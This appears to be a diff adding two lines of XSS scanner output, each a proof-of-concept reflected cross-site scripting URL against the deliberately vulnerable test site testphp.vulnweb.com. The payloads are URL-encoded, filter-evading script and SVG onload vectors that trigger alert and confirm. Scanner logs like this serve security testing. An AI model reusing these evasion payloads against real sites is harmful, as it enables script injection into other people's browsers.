@@ -1,0 +1,2 @@
+[POC][R][GET][inHTML-none(1)-URL] http://testphp.vulnweb.com/listproducts.php?artist=gxss&cat=%3CsCriPt%3Enew+Image%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dalert.bind%28%29%281%29%3E
+[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/listproducts.php?artist=gxss&cat=%3CsCriPt%3Enew+Image%22%3E%3Cscript%2F%22%3Ca%22%2Fsrc%3Ddata%3A%3D%22.%3Ca%2C%5B%5D.some%28confirm%29%3E   
